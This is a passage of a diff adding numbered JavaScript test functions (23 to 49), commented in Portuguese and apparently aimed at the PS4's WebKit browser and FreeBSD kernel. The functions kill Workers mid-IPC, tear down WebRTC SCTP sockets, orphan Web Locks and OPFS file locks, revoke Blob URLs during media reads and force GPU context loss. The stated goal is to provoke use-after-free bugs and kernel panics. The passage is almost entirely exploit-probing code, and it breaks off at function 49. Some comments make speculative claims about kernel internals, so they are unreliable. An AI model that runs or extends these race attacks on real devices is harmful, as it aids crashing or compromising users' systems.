+                    Atomics.wait(view, 0, 0); // Dorme indefinidamente no kernel
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            w.postMessage(sab);
+            
+            setTimeout(() => {
+                // Acorda a thread (syscall no kernel)
+                Atomics.notify(view, 0, 1); 
+                // Instantaneamente envia o sinal de destruição antes do TCB retornar ao userspace
+                w.terminate(); 
+                log("[Signal/TCB] Sinal de Wakeup e Terminate colidindo no kernel.");
+            }, 50);
+        }
+
+        // --- 23. ReadableStream IPC Routing Death ---
+        // Alvo: O pipeline de Streams C++. Transferir um stream de leitura 
+        // e destruir o receptor antes que o C++ consiga rotear os chunks na memória.
+        function runReadableStreamIPCDeath() {
+            log("[IPC/Streams] Iniciando ReadableStream Routing Death...");
+            if (typeof ReadableStream === 'undefined') return log("Streams não suportadas.");
+
+            let w = new Worker(URL.createObjectURL(new Blob(["onmessage=function(){}"], {type:"text/javascript"})));
+            
+            let stream = new ReadableStream({
+                start(controller) {
+                    // Enfileira dados ferozmente
+                    controller.enqueue(new Uint8Array(1024 * 1024)); 
+                }
+            });
+
+            // Transfere o ownership do stream pelo IPC
+            w.postMessage({ stream: stream }, [stream]);
+            
+            // Destrói a ponta receptora enquanto o proxy C++ tenta entregar os chunks
+            w.terminate();
+            
+            log("[IPC/Streams] Stream transferido e rota destruída.");
+        }
+
+        // --- 24. Wasm Table C++ Dispatch Race ---
+        // Alvo: Tabelas de funções WebAssembly (Dispatch Tables C++).
+        // Matar a thread exatamente quando o motor JIT está fazendo um salto 
+        // indireto (call_indirect) usando ponteiros nativos de memória.
+        function runWasmTableDispatchRace() {
+            log("[WASM/JIT] Iniciando Table Dispatch Race...");
+            
+            let workerCode = `
+                onmessage = function() {
+                    let tbl = new WebAssembly.Table({initial: 2, element: "anyfunc"});
+                    // Tenta acessar um ponteiro não inicializado da tabela
+                    try { tbl.get(0)(); } catch(e) {}
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            // Inicia o call_indirect no worker
+            w.postMessage("run");
+            
+            // Interrompe o salto C++ no meio da execução
+            w.terminate();
+            
+            log("[WASM/JIT] Worker terminado durante o salto de tabela.");
+        }
+
+        // --- 25. SAB + MessagePort GC Teardown ---
+        // Alvo: Desalocador de memória do WebCore. Enviar portas ativas contendo 
+        // ponteiros para SharedArrayBuffers e forçar a perda de referência.
+        function runSharedMemoryPortStress() {
+            log("[GC/Mem] Iniciando SAB Port Teardown...");
+            
+            let ch = new MessageChannel();
+            let sab = new SharedArrayBuffer(1024 * 1024);
+            
+            let workerCode = `
+                onmessage = function(e) {
+                    // Guarda as referências no escopo local do Worker
+                    self.port = e.ports[0];
+                    self.sab = e.data;
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            // Envia e transfere a porta IPC e o buffer compartilhado
+            w.postMessage(sab, [ch.port2]);
+            
+            // No mesmo tick da CPU, fecha a porta local e destrói o worker.
+            // Isso força o garbage collector do C++ a limpar um SAB que ainda 
+            // está amarrado a uma MessagePort "em voo" no IPC.
+            ch.port1.close();
+            w.terminate();
+            
+            log("[GC/Mem] Canal fechado e memória órfã gerada.");
+        }
+ // --- 26. FreeBSD Socketpair Allocation Race ---
+        // Alvo: MessageChannel cria um socketpair() no FreeBSD para comunicação inter-processos.
+        // O teste tenta transferir a porta e fechar a aba pai imediatamente, corrompendo a tabela de FDs.
+        function runSocketpairIPCRace() {
+            log("[FreeBSD/IPC] Iniciando Socketpair Allocation Race...");
+            try {
+                let mc = new MessageChannel();
+                let workerCode = `onmessage = function(e) { self.port = e.ports[0]; };`;
+                let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+                
+                // Pede ao C++ para rotear o File Descriptor (FD) para a thread
+                w.postMessage("transfer", [mc.port2]);
+                
+                // No exato momento em que o kernel tenta alocar o FD na thread filha, 
+                // destruímos violentamente a porta de origem e a thread.
+                mc.port1.close();
+                w.terminate();
+                
+                log("[FreeBSD/IPC] File Descriptors fechados e thread finalizada em voo.");
+            } catch(e) {
+                log("[FreeBSD/IPC] Erro: " + e.message);
+            }
+        }
+
+        // --- 27. SAB munmap() Physical Page Teardown ---
+        // Alvo: O gerenciador de memória virtual do FreeBSD (VMM).
+        // Quando um Worker com SAB morre, o WebKit chama munmap() para desmapear as páginas físicas.
+        // Se a thread estiver rodando código no momento exato do munmap, o kernel sofre um Page Fault.
+        function runMunmapPageFault() {
+            log("[FreeBSD/VMM] Iniciando munmap() Page Fault Race...");
+            
+            let sab = new SharedArrayBuffer(1024 * 1024 * 2); // 2MB
+            let workerCode = `
+                onmessage = function(e) {
+                    let view = new Uint8Array(e.data);
+                    // Loop finito rápido apenas para manter o ponteiro de instrução da CPU
+                    // varrendo as páginas de memória.
+                    for(let i=0; i<50000; i++) view[i % view.length] = i % 255;
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            w.postMessage(sab);
+            
+            // Corrida: A CPU ainda está escrevendo na memória física, 
+            // enquanto a thread principal pede ao FreeBSD para arrancar a página (munmap).
+            setTimeout(() => {
+                w.terminate();
+                log("[FreeBSD/VMM] munmap() disparado no kernel via destruição do Worker.");
+            }, 1);
+        }
+
+        // --- 28. AudioWorklet Real-Time Thread Teardown ---
+        // Alvo: O escalonador de threads do FreeBSD. AudioWorklets rodam em threads 
+        // com prioridade máxima (tempo real) para evitar engasgos no áudio.
+        // Destruir essa estrutura exige que o kernel rebaixe a prioridade e limpe o TCB com extremo cuidado.
+        function runRTThreadTeardown() {
+            log("[FreeBSD/Audio] Iniciando Real-Time Thread Teardown...");
+            try {
+                let ctx = new (window.AudioContext || window.webkitAudioContext)();
+                
+                // Criamos um nó fantasma. Em um ataque real completo, carregaríamos
+                // um módulo processor.js complexo. Aqui, usamos um nó nativo pesado.
+                let osc = ctx.createOscillator();
+                let gain = ctx.createGain();
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                
+                osc.start(0);
+                
+                // Pede ao C++ para suspender a thread de hardware e fechá-la instantaneamente
+                ctx.suspend();
+                ctx.close().then(() => {
+                    log("[FreeBSD/Audio] Contexto de tempo real destruído concorrentemente.");
+                });
+                
+                // Força o Garbage Collector a perder o rastro do objeto C++ em memória
+                osc = null;
+                ctx = null;
+            } catch(e) {
+                log("[FreeBSD/Audio] Erro: " + e.message);
+            }
+        }
+
+        // --- 29. Web Locks POSIX Mutex Orphan Race ---
+        // Alvo: O kernel do PS4 implementa travas de processos (mutexes).
+        // A API Web Locks mapeia essas travas para estruturas C++ inter-threads.
+        // Adquirir um lock no worker e matar a thread deixa o Mutex em estado inconsistente (órfão).
+        function runPOSIXMutexOrphan() {
+            log("[FreeBSD/Mutex] Iniciando Web Locks POSIX Orphan Race...");
+            if (!navigator.locks) return log("[FreeBSD/Mutex] Web Locks não suportado.");
+
+            let workerCode = `
+                navigator.locks.request("exploit_lock", {mode: "exclusive"}, async (lock) => {
+                    // Segura o lock no nível do kernel/C++ e avisa a main thread
+                    postMessage("locked");
+                    // Dorme artificialmente enquanto segura a trava
+                    await new Promise(r => setTimeout(r, 5000)); 
+                });
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            w.onmessage = function(e) {
+                if (e.data === "locked") {
+                    // Extermina a thread enquanto ela é a dona do Mutex POSIX no kernel
+                    w.terminate();
+                    log("[FreeBSD/Mutex] Thread destruída enquanto segurava um Mutex de processo.");
+                    
+                    // Tenta requisitar o mesmo lock. O kernel pode entrar em Deadlock ou Panic
+                    // ao tentar gerenciar uma trava que pertence a uma thread morta.
+                    navigator.locks.request("exploit_lock", {mode: "exclusive"}, async (lock) => {
+                        log("[FreeBSD/Mutex] Lock recuperado (Kernel não crashou nesta tentativa).");
+                    }).catch(()=> log("[FreeBSD/Mutex] Trava órfã falhou no C++."));
+                }
+            };
+        }
+
+        // --- 30. WebRTC SCTP Socket Kernel Teardown ---
+        // Alvo: A pilha de rede do FreeBSD. DataChannels usam o protocolo SCTP.
+        // Ele possui estruturas de estado muito complexas no kernel (associações).
+        // Destruir o objeto nativo durante a negociação (handshake) gera confusão de ponteiros (UAF).
+        function runSCTPNetworkTeardown() {
+            log("[FreeBSD/Net] Iniciando SCTP Socket Teardown...");
+            try {
+                let pc = new RTCPeerConnection({iceServers: []});
+                
+                // Cria o DataChannel, forçando a inicialização da stack SCTP C++/Kernel
+                let dc = pc.createDataChannel("sctp_crash_test", {negotiated: true, id: 1});
+                
+                // Abre o canal e tenta fechar o socket inteiro antes da rede estabilizar
+                dc.onopen = () => log("[FreeBSD/Net] Canal aberto incorretamente.");
+                
+                // Envia dados para o socket não inicializado e corta a conexão nativa
+                try { dc.send(new ArrayBuffer(1024)); } catch(e) {}
+                
+                pc.close();
+                pc = null;
+                dc = null;
+                
+                log("[FreeBSD/Net] Conexão SCTP truncada e objeto nativo destruído.");
+            } catch(e) {
+                log("[FreeBSD/Net] Erro: " + e.message);
+            }
+        }
+// --- 31. OPFS SyncAccessHandle POSIX Lock Teardown ---
+        // Alvo: O sistema de arquivos (VFS) do FreeBSD e as travas POSIX (flock/fcntl).
+        // Criar um lock síncrono exclusivo no Worker e matá-lo mid-write orfana a trava no SO.
+        function runOPFSFileLockTeardown() {
+            log("[VFS/Lock] Iniciando OPFS Lock Teardown...");
+            if (!navigator.storage || !navigator.storage.getDirectory) return log("[VFS] OPFS não suportado.");
+
+            let workerCode = `
+                onmessage = async function() {
+                    try {
+                        const dir = await navigator.storage.getDirectory();
+                        const fileHandle = await dir.getFileHandle('exploit.tmp', {create: true});
+                        // Cria uma trava síncrona exclusiva no nível do SO
+                        const syncHandle = await fileHandle.createSyncAccessHandle();
+                        
+                        let buffer = new Uint8Array(1024 * 1024 * 10); // 10MB
+                        // Inicia a escrita bloqueante (syscall writev)
+                        syncHandle.write(buffer); 
+                    } catch(e) {}
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            w.postMessage("start");
+            
+            // Aborta a thread no instante em que o kernel está processando a syscall write()
+            setTimeout(() => {
+                w.terminate();
+                log("[VFS/Lock] Worker exterminado. Trava POSIX possivelmente órfã.");
+            }, 10);
+        }
+
+        // --- 32. WebGL GPU Context Loss SAB Race ---
+        // Alvo: O driver da placa de vídeo e o gerenciador de memória gráfica.
+        // Forçar a perda de contexto (Context Loss) via extensão enquanto um SAB está sendo lido pela GPU.
+        function runWebGLContextLossRace() {
+            log("[GPU/Driver] Iniciando Context Loss Race...");
+            
+            let canvas = document.createElement('canvas');
+            let gl = canvas.getContext('webgl');
+            if (!gl) return log("[GPU] WebGL não suportado.");
+
+            let ext = gl.getExtension('WEBGL_lose_context');
+            if (!ext) return log("[GPU] Extensão lose_context não suportada.");
+
+            let sab = new SharedArrayBuffer(1024 * 1024 * 5); // 5MB
+            let view = new Uint8Array(sab);
+            
+            let tex = gl.createTexture();
+            gl.bindTexture(gl.TEXTURE_2D, tex);
+
+            // Inicia o upload massivo de memória física (SAB) para a VRAM (Placa de vídeo)
+            try {
+                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1024, 1024, 0, gl.RGBA, gl.UNSIGNED_BYTE, view);
+            } catch(e) {}
+
+            // Instantaneamente manda o driver da GPU destruir o contexto e desalocar a memória
+            // Isso cria uma corrida na DMA (Direct Memory Access) da placa.
+            ext.loseContext();
+            
+            log("[GPU/Driver] Contexto de GPU destruído durante upload de memória.");
+        }
+
+        // --- 33. Web MIDI SysEx Driver IPC Teardown ---
+        // Alvo: O driver de hardware de som/MIDI (ALSA/OSS interface no FreeBSD).
+        // Pede acesso exclusivo (SysEx) ao driver de hardware e destrói a ponte IPC imediatamente.
+        function runWebMIDISysExDriverRace() {
+            log("[Hardware/IPC] Iniciando MIDI SysEx Race...");
+            if (!navigator.requestMIDIAccess) return log("[Hardware] Web MIDI não suportado.");
+
+            // Pede acesso ao driver com privilégios de mensagens de sistema exclusivas
+            let promise = navigator.requestMIDIAccess({ sysex: true });
+            
+            // Destrói o contexto de recepção (Garbage Collection) antes da thread do driver responder
+            promise = null;
+            
+            log("[Hardware/IPC] Acesso ao driver solicitado e contexto local invalidado.");
+        }
+
+        // --- 34. WebRTC SCTP Kernel Fragmentation Panic ---
+        // Alvo: O buffer do kernel para fragmentação SCTP (Stream Control Transmission Protocol).
+        // Enviar uma mensagem colossal força o kernel a fragmentar pacotes. Destruir o socket no meio gera UAF.
+        function runSCTPFragmentationPanic() {
+            log("[Net/SCTP] Iniciando SCTP Fragmentation Panic...");
+            
+            try {
+                let pc = new RTCPeerConnection({iceServers: []});
+                let dc = pc.createDataChannel("sctp_frag", {negotiated: true, id: 2});
+                
+                // Payload de 100MB projetado para explodir a MTU e forçar o kernel a fragmentar agressivamente
+                let massivePayload = new ArrayBuffer(1024 * 1024 * 100); 
+                
+                dc.onopen = () => {
+                    // Envia os dados para as filas do C++ e do SO
+                    dc.send(massivePayload);
+                    
+                    // Fecha o DataChannel instantaneamente, forçando a rotina de limpeza do SCTP 
+                    // no FreeBSD a lidar com milhões de fragmentos pendentes.
+                    dc.close();
+                    pc.close();
+                    log("[Net/SCTP] Payload massivo fragmentado e socket abortado.");
+                };
+                
+                // Fallback caso a porta não abra corretamente, tentamos enviar no buffer interno
+                try { dc.send(massivePayload); dc.close(); pc.close(); } catch(e) {}
+                
+            } catch(e) {
+                log("[Net/SCTP] Erro: " + e.message);
+            }
+        }
+
+        // --- 35. SharedWorker Daemon Routing Death ---
+        // Alvo: O Daemon (processo de background) que gerencia SharedWorkers.
+        // Criar o processo do SharedWorker, transferir um MessagePort e forçar o GC na Main Thread.
+        function runSharedWorkerDaemonDeath() {
+            log("[Daemon/IPC] Iniciando SharedWorker Routing Death...");
+            
+            try {
+                let mc = new MessageChannel();
+                let workerCode = `onmessage = function(e) { self.port = e.ports[0]; };`;
+                
+                // O WebKit frequentemente inicia um novo processo ou thread isolada para SharedWorkers
+                let sw = new SharedWorker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+                
+                sw.port.start();
+                
+                // Roteia a porta para o Daemon do SharedWorker
+                sw.port.postMessage("transfer", [mc.port2]);
+                
+                // Quebra a conexão local brutalmente
+                mc.port1.close();
+                sw.port.close();
+                sw = null; // Tenta fazer o WebKit orfanar a comunicação com o Daemon
+                
+                log("[Daemon/IPC] Porta roteada e conexões locais orfanadas.");
+            } catch(e) {
+                log("[Daemon/IPC] Erro: " + e.message);
+            }
+        }
+ // --- 36. Wasm Shared Memory VMM Grow Teardown ---
+        // Alvo: O Virtual Memory Manager (VMM) do FreeBSD.
+        // Forçar o WebAssembly a pedir mais páginas físicas ao SO (grow) 
+        // em uma thread compartilhada e exterminar o processo simultaneamente.
+        function runWasmSharedMemoryGrowRace() {
+            log("[VMM/Wasm] Iniciando Shared Memory Grow Teardown...");
+            try {
+                let memory = new WebAssembly.Memory({initial: 1, maximum: 100, shared: true});
+                
+                let workerCode = `
+                    onmessage = function(e) {
+                        let mem = e.data;
+                        // Pede ao FreeBSD para remapear/alocar novas páginas físicas
+                        mem.grow(10); 
+                    };
+                `;
+                let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+                
+                w.postMessage(memory);
+                
+                // Extermina a thread no exato momento em que o kernel está alterando as tabelas de página
+                setTimeout(() => {
+                    w.terminate();
+                    log("[VMM/Wasm] Worker finalizado durante o mmap() nativo.");
+                }, 1);
+            } catch(e) {
+                log("[VMM/Wasm] Erro (SAB pode estar restrito): " + e.message);
+            }
+        }
+
+        // --- 37. WebRTC ICE Gathering Socket Death ---
+        // Alvo: Pilha de rede nativa. O WebKit delega a busca por candidatos ICE 
+        // (interfaces de rede locais/públicas) para threads nativas e sockets UDP.
+        function runRTCICECandidateTeardown() {
+            log("[Net/Sockets] Iniciando ICE Gathering Socket Death...");
+            try {
+                // Força a engine a buscar rotas agressivamente
+                let pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+                pc.createDataChannel("exploit");
+                
+                pc.createOffer().then(offer => {
+                    pc.setLocalDescription(offer);
+                    // O C++ começa a abrir dezenas de sockets UDP no FreeBSD para testar rotas
+                    
+                    // Fechamos a conexão nativa instantes após disparar a rede
+                    setTimeout(() => {
+                        pc.close();
+                        pc = null;
+                        log("[Net/Sockets] Objeto PC destruído enquanto o kernel resolvia ICE Candidates.");
+                    }, 5); 
+                });
+            } catch(e) {
+                log("[Net/Sockets] Erro: " + e.message);
+            }
+        }
+
+        // --- 38. MessagePort Deep Serialization Death ---
+        // Alvo: Engine de serialização C++ (Structured Clone Algorithm) via IPC.
+        // Transferir um ArrayBuffer gigantesco e matar a thread enquanto o C++ copia os ponteiros.
+        function runMessagePortSerializationDeath() {
+            log("[IPC/C++] Iniciando Deep Serialization Death...");
+            
+            let mc = new MessageChannel();
+            let workerCode = `onmessage = function() {};`;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            // Payload crítico: buffer grande o suficiente para atrasar o C++
+            let massiveBuffer = new ArrayBuffer(1024 * 1024 * 64); // 64MB
+            
+            // Inicia a transferência (detach + IPC routing)
+            w.postMessage({buf: massiveBuffer, port: mc.port2}, [massiveBuffer, mc.port2]);
+            
+            // Interrompe violentamente. Se o C++ estiver no meio da cópia/transferência
+            // de ownership do buffer, o ponteiro de memória fica flutuando (UAF).
+            w.terminate();
+            mc.port1.close();
+            
+            log("[IPC/C++] Transferência de 64MB abortada via SIGKILL de Worker.");
+        }
+
+        // --- 39. OffscreenCanvas GPU Compositor Teardown ---
+        // Alvo: Thread compositora de GPU do WebKit interagindo com os drivers de vídeo do PS4.
+        function runOffscreenCanvasGpuTeardown() {
+            log("[GPU/Driver] Iniciando OffscreenCanvas Compositor Teardown...");
+            if (typeof OffscreenCanvas === 'undefined') return log("[GPU] OffscreenCanvas não suportado.");
+
+            let canvas = document.createElement('canvas');
+            let offscreen = canvas.transferControlToOffscreen();
+            
+            let workerCode = `
+                onmessage = function(e) {
+                    let osc = e.data;
+                    let gl = osc.getContext('webgl');
+                    // Força a GPU a limpar o buffer, engajando os drivers nativos
+                    gl.clearColor(1.0, 0.0, 0.0, 1.0);
+                    gl.clear(gl.COLOR_BUFFER_BIT);
+                    gl.commit(); // Despacha para a thread compositora
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            w.postMessage(offscreen, [offscreen]);
+            
+            // Aborta a thread no meio da sincronização com a GPU
+            setTimeout(() => {
+                w.terminate();
+                log("[GPU/Driver] Thread destruída durante o gl.commit() nativo.");
+            }, 2);
+        }
+
+        // --- 40. Web Locks POSIX Mutex Worker Teardown ---
+        // Alvo: Travas de concorrência do sistema (Mutexes/Semáforos).
+        // Diferente do teste OPFS (arquivo), aqui atacamos o gerenciador de travas lógicas do C++.
+        function runWebLocksWorkerTeardown() {
+            log("[TCB/Mutex] Iniciando Web Locks Worker Teardown...");
+            if (!navigator.locks) return log("[TCB] Web Locks não suportado.");
+
+            let workerCode = `
+                navigator.locks.request("exploit_tcb_lock", {mode: "exclusive"}, async (lock) => {
+                    postMessage("acquired");
+                    // Mantém a trava presa indefinidamente no Worker
+                    await new Promise(() => {}); 
+                });
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            w.onmessage = function(e) {
+                if (e.data === "acquired") {
+                    // O C++ registrou que essa thread é a dona do Mutex.
+                    // Nós a matamos sem liberar a trava (release).
+                    w.terminate();
+                    log("[TCB/Mutex] Dona do Mutex destruída. Testando recuperação do kernel...");
+                    
+                    // Imediatamente tentamos requisitar a mesma trava na thread principal.
+                    // O C++ tem que lidar com uma trava cujo "dono" é um TCB fantasma.
+                    navigator.locks.request("exploit_tcb_lock", {mode: "exclusive"}, () => {
+                        log("[TCB/Mutex] Trava recuperada sem Kernel Panic.");
+                    }).catch(err => log("[TCB/Mutex] Erro no C++ ao lidar com trava órfã."));
+                }
+            };
+        }
+// --- 41. VFS vnode Media Driver fdrop Race ---
+        // Alvo: O Virtual File System (VFS) do FreeBSD.
+        // O WebKit mapeia Blobs para descritores de arquivo reais quando passados para
+        // o player de mídia nativo. Revogar a URL enquanto o driver lê o vnode causa UAF no kernel.
+        function runVFSMediaDriverRace() {
+            log("[FreeBSD/VFS] Iniciando Media Driver vnode Race...");
+            
+            let data = new Uint8Array(1024 * 1024 * 5).fill(0x00); // 5MB dummy data
+            let blob = new Blob([data], {type: 'video/mp4'});
+            let url = URL.createObjectURL(blob);
+            
+            let video = document.createElement('video');
+            video.src = url;
+            
+            // Força o WebKit a pedir ao kernel para abrir o arquivo e iniciar o driver de decodificação
+            video.play().catch(() => {});
+            
+            // Corrida letal: Revoga o File Descriptor (aciona fdrop no FreeBSD) 
+            // exatemente enquanto a thread de mídia do kernel está lendo o cabeçalho do MP4.
+            setTimeout(() => {
+                URL.revokeObjectURL(url);
+                video.removeAttribute('src');
+                video = null;
+                log("[FreeBSD/VFS] URL revogada durante a leitura do driver nativo.");
+            }, 2);
+        }
+
+        // --- 42. Real-Time kthread IPC Teardown ---
+        // Alvo: Threads de tempo real do SO (kthreads) usadas pelo AudioWorklet.
+        // Enviar uma mensagem pesada via IPC para a thread de áudio e fechar o contexto de hardware.
+        function runAudioWorkletIPCTeardown() {
+            log("[FreeBSD/kthread] Iniciando AudioWorklet IPC Teardown...");
+            
+            try {
+                let ctx = new (window.AudioContext || window.webkitAudioContext)();
+                let blob = new Blob([`
+                    class ExploitProcessor extends AudioWorkletProcessor {
+                        process(inputs, outputs, parameters) { return true; }
+                    }
+                    registerProcessor('exploit', ExploitProcessor);
+                `], {type: 'application/javascript'});
+                
+                ctx.audioWorklet.addModule(URL.createObjectURL(blob)).then(() => {
+                    let node = new AudioWorkletNode(ctx, 'exploit');
+                    
+                    // Dispara um ArrayBuffer gigante para encher a fila IPC da thread nativa
+                    let massiveBuffer = new ArrayBuffer(1024 * 1024 * 10);
+                    node.port.postMessage(massiveBuffer, [massiveBuffer]);
+                    
+                    // Imediatamente comanda o fechamento do dispositivo de áudio no nível do SO
+                    ctx.close();
+                    log("[FreeBSD/kthread] Contexto destruído enquanto o IPC roteava para a kthread.");
+                }).catch(e => log("[FreeBSD/kthread] Erro ao carregar módulo: " + e.message));
+            } catch(e) {
+                log("[FreeBSD/kthread] API não suportada ou erro: " + e.message);
+            }
+        }
+
+        // --- 43. kqueue IPC Pipe Buffer Overflow Death ---
+        // Alvo: A fila de eventos do kernel (kqueue).
+        // Encher o buffer de um pipe IPC até o limite do FreeBSD e matar o Worker receptor.
+        function runKqueuePipeOverflowDeath() {
+            log("[FreeBSD/kqueue] Iniciando IPC Pipe Buffer Death...");
+            
+            let mc = new MessageChannel();
+            let workerCode = `onmessage = function() { /* worker fantasma */ };`;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            // Roteia a porta para forçar a criação do pipe no SO
+            w.postMessage("init", [mc.port2]);
+            
+            // Spamma o kqueue nativo com dezenas de milhares de mensagens sem dar tempo de leitura
+            for(let i = 0; i < 20000; i++) {
+                mc.port1.postMessage("overflow_the_kqueue_buffer");
+            }
+            
+            // Aborta o Worker violentamente. O kernel agora tem um pipe cheio 
+            // e precisa limpar a estrutura sem o C++ receptor.
+            w.terminate();
+            mc.port1.close();
+            
+            log("[FreeBSD/kqueue] Worker destruído após inundação do pipe IPC nativo.");
+        }
+
+        // --- 44. Wasm JIT Streaming VFS Teardown ---
+        // Alvo: Interseção entre o VFS do FreeBSD e as pthreads do compilador JIT do WebKit.
+        // Iniciar um fetch() síncrono para o JIT e abortar a thread de origem.
+        function runWasmStreamingVFSRace() {
+            log("[WebCore/JIT] Iniciando Wasm Streaming Teardown...");
+            
+            let workerCode = `
+                onmessage = function(e) {
+                    // InstantiationStreaming liga a API de Fetch (Rede/VFS) direto no JIT C++
+                    WebAssembly.instantiateStreaming(fetch(e.data)).catch(()=>{});
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            // Cria um blob grande para garantir que o fetch demore e divida em vários chunks (múltiplas syscalls)
+            let dummyWasm = new Blob([new Uint8Array(1024 * 1024 * 5)], {type: 'application/wasm'});
+            w.postMessage(URL.createObjectURL(dummyWasm));
+            
+            // Destrói o Worker enquanto a thread background do C++ está 
+            // consumindo o file descriptor mapeado pelo fetch().
+            setTimeout(() => {
+                w.terminate();
+                log("[WebCore/JIT] Thread exterminada durante a leitura VFS para o compilador JIT.");
+            }, 3);
+        }
+
+        // --- 45. FreeBSD native SCTP Association Close Race ---
+        // Alvo: A implementação nativa do protocolo SCTP no kernel do FreeBSD.
+        // O WebKit mapeia DataChannels diretamente para sockets SCTP do SO. 
+        function runSCTPAssociationCloseRace() {
+            log("[FreeBSD/SCTP] Iniciando SCTP Association Close Race...");
+            
+            try {
+                let pc = new RTCPeerConnection({iceServers: []});
+                // Cria múltiplos canais para forçar o kernel a alocar múltiplas streams na mesma associação SCTP
+                let dc1 = pc.createDataChannel("sctp_1", {negotiated: true, id: 10});
+                let dc2 = pc.createDataChannel("sctp_2", {negotiated: true, id: 11});
+                
+                // Força o envio nos sockets pendentes (o kernel coloca em buffer)
+                try { dc1.send("A"); dc2.send("B"); } catch(e){}
+                
+                // Desencadeia a rotina de sctp_close() do FreeBSD. 
+                // Se a associação não estiver estabilizada, pode gerar Use-After-Free no kernel.
+                dc1.close();
+                pc.close();
+                
+                log("[FreeBSD/SCTP] Associação SCTP abortada no nível do kernel.");
+            } catch(e) {
+                log("[FreeBSD/SCTP] Erro: " + e.message);
+            }
+        }
+// --- 46. SCTP Socket Garbage Collection Race ---
+        // Alvo: Pilha de rede do FreeBSD. Força o Garbage Collector do JavaScript 
+        // a limpar um RTCPeerConnection no exato momento em que o socket SCTP 
+        // no kernel está tentando estabelecer o handshake inicial.
+        function runSCTPDataChannelGCRace() {
+            log("[FreeBSD/SCTP] Iniciando SCTP GC Race...");
+            try {
+                let pc = new RTCPeerConnection({iceServers: []});
+                let dc = pc.createDataChannel("gc_race", {negotiated: true, id: 99});
+                
+                // Dispara dados para forçar o kernel a alocar buffers SCTP (mbufs)
+                try { dc.send(new ArrayBuffer(1024 * 500)); } catch(e) {}
+                
+                // Removemos todas as referências brutalmente e forçamos o C++ 
+                // a lidar com um objeto órfão no nível do kernel
+                dc = null;
+                pc = null;
+                
+                // Alocação pesada para tentar forçar o Garbage Collector a agir imediatamente
+                let pressure = [];
+                for(let i=0; i<5000; i++) pressure.push(new ArrayBuffer(1024 * 1024));
+                
+                log("[FreeBSD/SCTP] Conexão orfanada. Pressionando GC para limpar a estrutura C++.");
+            } catch(e) {
+                log("[FreeBSD/SCTP] Erro: " + e.message);
+            }
+        }
+
+        // --- 47. OfflineAudioContext pthread Teardown ---
+        // Alvo: Gerenciamento de pthreads do WebKit. O OfflineAudioContext cria 
+        // threads de fundo (background pthreads) para renderizar áudio o mais rápido possível,
+        // sem travar o kernel em tempo real. Destruir o worker pai orfana a pthread de renderização.
+        function runOfflineAudioRenderTeardown() {
+            log("[WebCore/pthreads] Iniciando Offline Audio Teardown...");
+            
+            let workerCode = `
+                onmessage = function() {
+                    let offlineCtx = new OfflineAudioContext(2, 44100 * 40, 44100); // 40 segundos de áudio
+                    let osc = offlineCtx.createOscillator();
+                    osc.connect(offlineCtx.destination);
+                    osc.start();
+                    
+                    // Inicia a renderização pesada em uma thread C++ de background
+                    offlineCtx.startRendering(); 
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            w.postMessage("start");
+            
+            // Aborta a thread do JavaScript enquanto a thread nativa C++ do renderizador 
+            // está alocando e processando memória no FreeBSD.
+            setTimeout(() => {
+                w.terminate();
+                log("[WebCore/pthreads] Worker JS exterminado durante renderização C++ nativa.");
+            }, 10);
+        }
+
+        // --- 48. OPFS Sync VFS Blob Revocation ---
+        // Alvo: O Virtual File System (VFS) do FreeBSD.
+        // Um Worker escreve dados sincronicamente (syscall bloqueante no FreeBSD) em um arquivo OPFS.
+        // O dado vem de um Blob URL que revogamos concorrentemente na thread principal.
+        function runOPFSBlobRevocationRace() {
+            log("[FreeBSD/VFS] Iniciando OPFS Sync Blob Race...");
+            if (!navigator.storage || !navigator.storage.getDirectory) return log("[VFS] OPFS não suportado.");
+
+            let dummyData = new Uint8Array(1024 * 1024 * 20); // 20MB
+            let blob = new Blob([dummyData]);
+            let url = URL.createObjectURL(blob);
+
+            let workerCode = `
+                onmessage = async function(e) {
+                    try {
+                        let res = await fetch(e.data);
+                        let buf = await res.arrayBuffer();
+                        
+                        let dir = await navigator.storage.getDirectory();
+                        let handle = await dir.getFileHandle('vfs_race.tmp', {create: true});
+                        let syncHandle = await handle.createSyncAccessHandle();
+                        
+                        // Trava a thread no kernel escrevendo os 20MB
+                        syncHandle.write(new Uint8Array(buf)); 
+                    } catch(err) {}
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            w.postMessage(url);
+            
+            // Corrida letal: Destrói o ponteiro do arquivo de origem na memória (revoke) 
+            // enquanto o driver VFS do FreeBSD está tentando ler dele para escrever no disco.
+            setTimeout(() => {
+                URL.revokeObjectURL(url);
+                w.terminate();
+                log("[FreeBSD/VFS] Origem revogada e syscall de escrita interrompida.");
+            }, 5);
+        }
+
+        // --- 49. WebGL2 TransformFeedback VRAM UAF ---
+        // Alvo: Driver da placa de vídeo (VRAM). O TransformFeedback do WebGL2 
